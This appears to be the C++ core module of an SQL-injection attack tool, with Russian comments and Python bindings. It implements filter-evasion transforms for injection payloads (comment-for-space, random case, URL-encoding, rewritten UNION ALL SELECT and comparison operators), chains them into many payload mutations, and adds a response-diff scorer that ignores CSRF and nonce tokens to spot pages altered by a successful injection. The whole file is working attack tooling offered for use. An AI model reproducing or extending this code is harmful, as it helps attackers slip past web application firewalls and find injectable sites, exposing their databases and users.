// sqli_core.cpp — C++-ядро: движок мутаций + дифф-анализатор ответов.
// Сборка: python build_sqli_core.py (или см. скрипт)
// Использование из Python: import sqli_core; sqli_core.mutate(...)

#include <pybind11/pybind11.h>
#include <pybind11/stl.h>
#include <string>
#include <vector>
#include <unordered_set>
#include <unordered_map>
#include <algorithm>
#include <sstream>
#include <random>
#include <cctype>
#include <functional>

namespace py = pybind11;

// ---------- Вспомогательные строковые утилиты ----------

static std::string to_lower(const std::string& s) {
 std::string r = s;
 std::transform(r.begin(), r.end(), r.begin(),
 [](unsigned char c){ return std::tolower(c); });
 return r;
}

static bool contains_ci(const std::string& haystack, const std::string& needle) {
 return to_lower(haystack).find(to_lower(needle)) != std::string::npos;
}

// ---------- Тамперы (C++-реализации встроенных) ----------

static std::string t_space2comment(const std::string& p) {
 std::string r;
 for (char c: p) r += (c == ' ') ? "/**/": std::string(1, c);
 return r;
}

static std::string t_randomcase(const std::string& p, std::mt19937& rng) {
 std::string r = p;
 std::uniform_real_distribution<double> d(0.0, 1.0);
 for (auto& c: r)
 if (d(rng) > 0.5) c = std::toupper((unsigned char)c);
 else c = std::tolower((unsigned char)c);
 return r;
}

static std::string t_charencode(const std::string& p) {
 static const std::unordered_map<char, std::string> table = {
 {'\'', "%27"}, {'(', "%28"}, {')', "%29"}, {';', "%3B"}, {' ', "%20"}};
 std::string r;
 for (char c: p) {
 auto it = table.find(c);
 r += (it != table.end()) ? it->second: std::string(1, c);
 }
 return r;
}

static std::string t_between(const std::string& p) {
 std::string r = p;
 size_t pos = 0;
 while ((pos = r.find('>', pos)) != std::string::npos) {
 r.replace(pos, 1, " NOT BETWEEN 0 AND ");
 pos += 19;
 }
 return r;
}

static std::string t_unionall(const std::string& p) {
 std::string r = p;
 const std::string from = "UNION ALL SELECT";
 const std::string to = "UNION/**/ALL/**/SELECT";
 size_t pos = 0;
 while ((pos = to_lower(r).find(from, pos)) != std::string::npos) {
 r.replace(pos, from.size(), to);
 pos += to.size();
 }
 return r;
}

// ---------- Движок мутаций ----------

// mutate(payload, count, extra_tampers) -> list[str]
// extra_tampers: dict name -> python callable(str)->str, прокидывается из Python
static std::vector<std::string> mutate(const std::string& payload, int count,
 const py::dict& extra_tampers) {
 std::mt19937 rng(std::random_device{}());
 std::unordered_set<std::string> results;
 results.insert(payload);

 // собираем цепочку функций: встроенные C++ + python-колбэки
 std::vector<std::function<std::string(const std::string&)>> fns;
 fns.push_back([](const std::string& p){ return t_space2comment(p); });
 fns.push_back([&rng](const std::string& p){ return t_randomcase(p, rng); });
 fns.push_back([](const std::string& p){ return t_charencode(p); });
 fns.push_back([](const std::string& p){ return t_between(p); });
 fns.push_back([](const std::string& p){ return t_unionall(p); });

 for (auto item: extra_tampers) {
 if (!py::isinstance<py::function>(item.second)) continue;
 py::function fn = item.second.cast<py::function>();
 fns.push_back([fn](const std::string& p) -> std::string {
 py::gil_scoped_acquire acquire;
 try {
 py::object res = fn(p);
 return res.cast<std::string>();
 } catch (...) {
 return p;
 }
 });
 }

 // одиночные тамперы
 for (auto& fn: fns) {
 try { results.insert(fn(payload)); } catch (...) {}
 }
 // парные комбинации (детерминированные, первые count штук)
 for (size_t i = 0; i < fns.size() && (int)results.size() < 8 + count; i++) {
 for (size_t j = 0; j < fns.size() && j != i; j++) {
 try {
 results.insert(fns[j](fns[i](payload)));
 } catch (...) {}
 if ((int)results.size() >= 8 + count) break;
 }
 }
 // случайные тройные комбинации
 std::uniform_int_distribution<size_t> pick(0, fns.size() - 1);
 for (int k = 0; k < count; k++) {
 try {
 std::string cur = payload;
 for (int step = 0; step < 3; step++) cur = fns[pick(rng)](cur);
 results.insert(cur);
 } catch (...) {}
 }
 return std::vector<std::string>(results.begin(), results.end());
}

// ---------- Дифф-анализатор ответов ----------

// Нормализация HTML: срезаем теги, числа, длинные токены -> плейсхолдеры.
// Цель: два ответа одного шаблона должны дать почти одинаковые токены,
// а ответ с изменённой структурой (след инъекции) — заметно другой набор.
static std::vector<std::string> normalize_tokens(const std::string& html) {
 std::vector<std::string> tokens;
 std::string cur;
 bool in_tag = false;
 int depth = 0;
 for (char c: html) {
 if (c == '<') { in_tag = true; depth++;
 if (!cur.empty()) { tokens.push_back(cur); cur.clear(); }
 continue; }
 if (c == '>') { in_tag = false;
 if (!cur.empty()) { tokens.push_back(cur); cur.clear(); }
 continue; }
 if (in_tag) {
 // внутри тега: собираем имя тега/атрибута
 if (c == ' ' || c == '\n' || c == '\t' || c == '/' || c == '=') {
 if (!cur.empty()) { tokens.push_back("T:" + cur); cur.clear(); }
 } else cur += std::tolower((unsigned char)c);
 } else {
 // текстовый узел: слова, числа -> N
 if (c == ' ' || c == '\n' || c == '\t' || ispunct((unsigned char)c)) {
 if (!cur.empty()) {
 bool numeric = !cur.empty() && cur.find_first_not_of("0123456789.") == std::string::npos;
 tokens.push_back(numeric ? "N": "W:" + to_lower(cur.substr(0, 20)));
 cur.clear();
 }
 } else cur += c;
 }
 }
 if (!cur.empty()) tokens.push_back(cur);
 // срезаем динамические шумовые токены (csrf, nonce, timestamp)
 std::vector<std::string> filtered;
 for (auto& t: tokens) {
 if (contains_ci(t, "csrf") || contains_ci(t, "nonce")
 || contains_ci(t, "timestamp") || contains_ci(t, "token"))
 continue;
 filtered.push_back(t);
 }
 return filtered;
}

// diff_score(a, b) -> double [0..1]: 1 = идентичны, 0 = полностью разные.
// Коэффициент Жаккара по множеству токенов + вес по разнице длины.
static double diff_score(const std::string& a, const std::string& b) {
 auto ta = normalize_tokens(a);
 auto tb = normalize_tokens(b);
 std::unordered_set<std::string> sa(ta.begin(), ta.end());
 std::unordered_set<std::string> sb(tb.begin(), tb.end());
 if (sa.empty() && sb.empty()) return 1.0;
 int inter = 0;
 for (auto& t: sa) if (sb.count(t)) inter++;
 size_t uni = sa.size() + sb.size() - inter;
 double jac = uni == 0 ? 1.0: (double)inter / (double)uni;
 // штраф за разницу длины (защита от ложняка на динамическом контенте)
 double la = (double)a.size(), lb = (double)b.size();
 double len_ratio = std::min(la, lb) / (std::max(la, lb) + 1.0);
 return 0.7 * jac + 0.3 * len_ratio;
}

PYBIND11_MODULE(sqli_core, m) {
 m.doc() = "SQLi orchestrator C++ core: mutation engine + response diff";
 m.def("mutate", &mutate, py::arg("payload"), py::arg("count") = 8,
 py::arg("extra_tampers") = py::dict(),
 "Сгенерировать мутации пейлоада (цепочки тамперов)");
 m.def("diff_score", &diff_score, py::arg("a"), py::arg("b"),
 "Структурное сходство двух ответов [0..1]");
 m.def("normalize_tokens", &normalize_tokens, py::arg("html"),
 "Нормализованные DOM-токены ответа");
}